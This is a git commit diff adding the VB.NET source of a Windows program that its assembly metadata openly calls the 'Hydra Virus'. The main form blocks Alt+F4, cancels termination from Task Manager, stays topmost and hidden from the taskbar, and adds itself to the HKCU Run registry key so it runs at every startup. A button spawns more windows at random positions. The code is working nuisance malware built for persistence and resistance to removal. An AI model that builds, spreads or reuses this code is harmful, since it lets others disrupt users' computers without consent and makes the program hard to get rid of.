e9fd9d29e018842ed3297d20170e0e71e5100a15
NattyXO <nattyxo2018@gmail.com>
2024-01-06 14:25:12 +0300

    v1.0

---
+++ hidra/Form1.vb
@@ -0,0 +1,67 @@
+﻿Imports Microsoft.Win32
+Public Class Form1
+
+    Private Const WM_SYSKEYDOWN As Integer = &H104
+    Private Const VK_F4 As Integer = &H73
+    Private Const MOD_ALT As Integer = &H1
+
+    Protected Overrides Function ProcessCmdKey(ByRef msg As Message, keyData As Keys) As Boolean
+        If (msg.Msg = WM_SYSKEYDOWN AndAlso (keyData = (Keys.F4 Or Keys.Alt))) Then
+            ' Prevent Alt+F4 from closing the form
+            Return True
+        End If
+        Return MyBase.ProcessCmdKey(msg, keyData)
+    End Function
+
+    Private Sub AddToStartup()
+        Try
+            ' Get the current user's registry key
+            Dim rkCurrentUser As RegistryKey = Registry.CurrentUser
+
+            ' Open the registry key for startup applications
+            Dim rkApp = rkCurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
+
+            ' Add your application to the startup
+            rkApp.SetValue("YourAppName", Application.ExecutablePath)
+
+            ' Close the registry key
+            rkApp.Close()
+
+            ' Hide the application's main window (optional)
+            Me.Visible = False
+
+        Catch ex As Exception
+            MessageBox.Show($"Error adding to startup: {ex.Message}")
+        End Try
+    End Sub
+    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+        Me.TopMost = True
+        Me.ShowInTaskbar = False
+        AddToStartup()
+    End Sub
+
+    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
+        Dim h2 As Form2 = New Form2()
+        Dim h3 As Form3 = New Form3()
+        Dim h4 As Form4 = New Form4()
+
+        h2.Show()
+        h3.Show()
+        h4.Show()
+        Me.Hide()
+
+        h2.Location = New Point(Rnd() * 900, Rnd() * 180)
+        h3.Location = New Point(Rnd() * 860, Rnd() * 300)
+        h4.Location = New Point(Rnd() * 700, Rnd() * 480)
+
+    End Sub
+
+    Private Sub hydra1_closing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
+        If e.CloseReason = CloseReason.TaskManagerClosing Then
+            ' Custom logic to handle Task Manager termination
+            ' Optionally, show a message or prevent the form from closing
+            e.Cancel = True
+        End If
+
+    End Sub
+End Class
---
+++ hidra/My Project/AssemblyInfo.vb
@@ -0,0 +1,35 @@
+﻿Imports System
+Imports System.Reflection
+Imports System.Runtime.InteropServices
+
+' General Information about an assembly is controlled through the following
+' set of attributes. Change these attribute values to modify the information
+' associated with an assembly.
+
+' Review the values of the assembly attributes
+
+<Assembly: AssemblyTitle("Hydra Virus")>
+<Assembly: AssemblyDescription("Hydra is a Windows virus that displays a message box. When you close a message box, 2 more will show up.")>
+<Assembly: AssemblyCompany("")>
+<Assembly: AssemblyProduct("Hydra Virus")>
+<Assembly: AssemblyCopyright("Copyright ©  2019")>
+<Assembly: AssemblyTrademark("")>
+
+<Assembly: ComVisible(False)>
+
+'The following GUID is for the ID of the typelib if this project is exposed to COM
+<Assembly: Guid("762aaa51-70fe-4deb-b79e-3bbacfb1d702")>
+
+' Version information for an assembly consists of the following four values:
+'
+'      Major Version
+'      Minor Version
+'      Build Number
+'      Revision
+'
+' You can specify all the values or you can default the Build and Revision Numbers
+' by using the '*' as shown below:
+' <Assembly: AssemblyVersion("1.0.*")>
+
+<Assembly: AssemblyVersion("1.0.0.0")>
+<Assembly: AssemblyFileVersion("1.0.0.0")>
